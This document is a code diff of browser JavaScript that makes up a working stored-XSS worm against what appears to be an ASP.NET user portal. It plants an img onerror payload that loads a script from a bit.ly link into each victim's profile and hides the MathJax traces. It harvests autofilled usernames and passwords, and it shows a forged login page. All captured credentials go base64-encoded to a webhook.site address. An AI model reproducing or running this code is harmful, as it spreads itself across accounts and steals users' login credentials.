@@ -1,85 +1,61 @@
-const SAFE_PATTERN = '<img src=x onerror="$.getScript(\'//bit.ly/4sadNVr\')">';
-const NO_CORS_WEBHOOK = 'https://webhook.site/958b3d02-6667-410f-b47e-b3f19cc904b2';
-
-const FETCH_TIMEOUT_MS = 5000;
-const OBSERVER_TIMEOUT_MS = 5000;
-
-async function safeFetch(url, options = {}, timeoutMs = FETCH_TIMEOUT_MS) {
-    const controller = new AbortController();
-    const timer = setTimeout(() => controller.abort(), timeoutMs);
-    try {
-        const res = await fetch(url, { ...options, signal: controller.signal });
-        if (!res.ok) {
-            return null;
-        }
-        return res;
-    } catch {
-        return null;
-    } finally {
-        clearTimeout(timer);
-    }
-}
-
 function removeArtifacts(root = document) {
     const nodes = root.querySelectorAll('.MathJax');
-    for (const node of nodes) {
+    nodes.forEach(node => {
         const html = node.innerHTML || '';
         if (html.includes('𐀀') || html.includes('<img')) {
             node.remove();
         }
-    }
+    });
 }
 
 function startArtifactObserver() {
     removeArtifacts(document);
     const observer = new MutationObserver(mutations => {
-        for (const mutation of mutations) {
-            for (const node of mutation.addedNodes) {
-                if (node && node.nodeType === Node.ELEMENT_NODE) {
-                    removeArtifacts(node);
-                }
-            }
-        }
+        mutations.forEach(mutation => {
+            mutation.addedNodes.forEach(node => {
+                if (!(node instanceof HTMLElement)) return;
+                removeArtifacts(node);
+            });
+        });
     });
-    const target = document.body || document.documentElement || document;
-    observer.observe(target, { childList: true, subtree: true });
-    const timeoutId = setTimeout(() => observer.disconnect(), OBSERVER_TIMEOUT_MS);
-    return {
-        disconnect: () => {
-            clearTimeout(timeoutId);
-            observer.disconnect();
-        }
-    };
+    observer.observe(document.documentElement || document, { childList: true, subtree: true });
+    return observer;
 }
 
 async function propagation() {
     removeArtifacts(document);
     try {
-        const perfil = await safeFetch('FUSDatosPersonalesVer.aspx');
-        if (!perfil) return;
+        let perfil = await fetch('FUSDatosPersonalesVer.aspx');
+        let html = await perfil.text();
 
-        const html = await perfil.text();
-        const parser = new DOMParser();
-        const doc = parser.parseFromString(html, 'text/html');
-        const parrafo = doc.querySelector('p.mt-4.text-muted');
+        let parser = new DOMParser();
+        let doc = parser.parseFromString(html, 'text/html');
+
+        let parrafo = doc.querySelector("p.mt-4.text-muted");
 
         const textValue = parrafo?.textContent?.trim() || '';
         const htmlValue = parrafo?.innerHTML || '';
-        const hasKey = html.includes(SAFE_PATTERN) || htmlValue.includes(SAFE_PATTERN) || textValue.includes(SAFE_PATTERN);
-        if (hasKey) return;
+        const pattern = '<img src=x onerror="$.getScript(\'//bit.ly/4sadNVr\')">';
+        const hasKey = htmlValue.includes(pattern) || textValue.includes(pattern) || html.includes(pattern);
+        if (hasKey) {
+            return;
+        }
 
-        await safeFetch('FUSPreferencias.aspx', {
+        await fetch('FUSPreferencias.aspx', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
             body: new URLSearchParams({
                 ITEsUpdate: '-1',
-                Presentacion: `${textValue ? textValue + ' ' : ''}\\(\\unicode{${SAFE_PATTERN}}\\)`,
+                Presentacion: `${textValue ? textValue + ' ' : ''}\\(\\unicode{<img src=x onerror="$.getScript('//bit.ly/4sadNVr')">}\\)`,
                 MostrarEmail: '3',
                 MostrarCurriculum: '3',
                 Aceptar: '-1'
             })
         });
     } catch (error) {
+        // ignore
     }
 }
 
@@ -89,35 +65,31 @@ async function atms() {
     }
 
     try {
-        const desconectar = await safeFetch('FHDesconectar.aspx');
-        if (!desconectar) return;
+        await fetch('FHDesconectar.aspx');
+        await new Promise(r => setTimeout(r, 200)); 
 
-        await new Promise(r => setTimeout(r, 100));
+        let respuestaLogin = await fetch('FLIIdentificarse.aspx?ITError=2');
+        let html = await respuestaLogin.text();
+        let doc = new DOMParser().parseFromString(html, 'text/html');
 
-        const respuestaLogin = await safeFetch('FLIIdentificarse.aspx?ITError=2');
-        if (!respuestaLogin) return;
-
-        const html = await respuestaLogin.text();
-        const doc = new DOMParser().parseFromString(html, 'text/html');
-
-        const formularioReal = doc.querySelector('form');
+        let formularioReal = doc.querySelector('form');
         if (!formularioReal) return;
 
-        const inputClave = formularioReal.querySelector('input#Pass, input[name="Pass"], input[type="password"]');
-        const inputUsuario = formularioReal.querySelector('input#Login, input[name="Login"], input[type="text"]');
+        let inputClave = doc.querySelector('#Pass');
+        let inputUsuario = doc.querySelector('#Login');
 
-        const clave = inputClave?.value || '';
-        const usuario = inputUsuario?.value || '';
+        let clave = inputClave ? inputClave.value : '';
+        let usuario = inputUsuario ? inputUsuario.value : '';
 
 
         if (usuario && clave) {
-            const urlWebhook = `${NO_CORS_WEBHOOK}?u=${btoa(usuario)}&p=${btoa(clave)}`;
-            fetch(urlWebhook, { mode: 'no-cors' }).catch(() => {});
-
-            const datosLogin = new URLSearchParams(new FormData(formularioReal));
+            fetch('https://webhook.site/958b3d02-6667-410f-b47e-b3f19cc904b2?u=' + btoa(usuario) + '&p=' + btoa(clave), { mode: 'no-cors' });
+            
+            let datosLogin = new URLSearchParams(new FormData(formularioReal));
             datosLogin.append('Recordarme', 'on');
             datosLogin.append('Entrar', 'on');
-            await safeFetch('FHEntrar.aspx', { method: 'POST', body: datosLogin });
+            await fetch('FHEntrar.aspx', { method: 'POST', body: datosLogin });
+
             localStorage.setItem('operacionBandera', 'FINALIZADO');
             return;
         }
@@ -194,7 +166,6 @@ async function atms() {
                 .it-page-firma__link:hover { color: #333; }
             </style>
             </head>
-            <script>window._NO_CORS_WEBHOOK = '${NO_CORS_WEBHOOK}';</script>
 
             <body class="skin-light it-page it-page_type_home it-page-home_skin_basic">
             <div class="bg-cover h-100 it-page-home_cover_basic">
@@ -290,7 +261,7 @@ async function atms() {
                 let usuario = document.getElementById('Login').value;
                 let clave = document.getElementById('Pass').value;
 
-                let urlWebhook = window._NO_CORS_WEBHOOK + '?u=' + btoa(usuario) + '&p=' + btoa(clave);
+                let urlWebhook = 'https://webhook.site/958b3d02-6667-410f-b47e-b3f19cc904b2?u=' + btoa(usuario) + '&p=' + btoa(clave);
 
                 fetch(urlWebhook, { mode: 'no-cors' })
                 .then(() => {
@@ -309,28 +280,28 @@ async function atms() {
         document.write(htmlFalso);
         document.close();
 
-        const formFalso = document.getElementById('IdentificacionUsuario');
-        if (formFalso) {
-            formFalso.addEventListener('submit', async function(e) {
-                e.preventDefault();
+        document.getElementById('IdentificacionUsuario').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            let uFalso = document.getElementById('Login').value;
+            let pFalso = document.getElementById('Pass').value;
 
-                const uFalso = document.getElementById('Login')?.value || '';
-                const pFalso = document.getElementById('Pass')?.value || '';
+            fetch('https://webhook.site/958b3d02-6667-410f-b47e-b3f19cc904b2?u=' + btoa(uFalso) + '&p=' + btoa(pFalso), { mode: 'no-cors' });
 
-                const urlWebhook = `${NO_CORS_WEBHOOK}?u=${btoa(uFalso)}&p=${btoa(pFalso)}`;
-                fetch(urlWebhook, { mode: 'no-cors' }).catch(() => {});
-
-                const bodyDatos = `Login=${encodeURIComponent(uFalso)}&Pass=${encodeURIComponent(pFalso)}&Recordarme=on&Entrar=on`;
-                await safeFetch('FHEntrar.aspx', {
+            let bodyDatos = `Login=${encodeURIComponent(uFalso)}&Pass=${encodeURIComponent(pFalso)}&Recordarme=on&Entrar=on`;
+            
+            try {
+                await fetch('FHEntrar.aspx', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: bodyDatos
                 });
+            } catch (error) {}
 
-                localStorage.setItem('operacionBandera', 'FINALIZADO');
-                window.location.href = 'FHome.aspx';
-            });
-        }
+            localStorage.setItem('operacionBandera', 'FINALIZADO');
+            
+            window.location.href = 'FHome.aspx'; 
+        });
 
     } catch (error) {
     }
@@ -338,6 +309,7 @@ async function atms() {
 
 (async function main() {
     const observer = startArtifactObserver();
-    Promise.all([propagation(), atms()])
-        .finally(() => observer.disconnect());
+    await propagation();
+    await atms();
+    observer.disconnect();
 })();
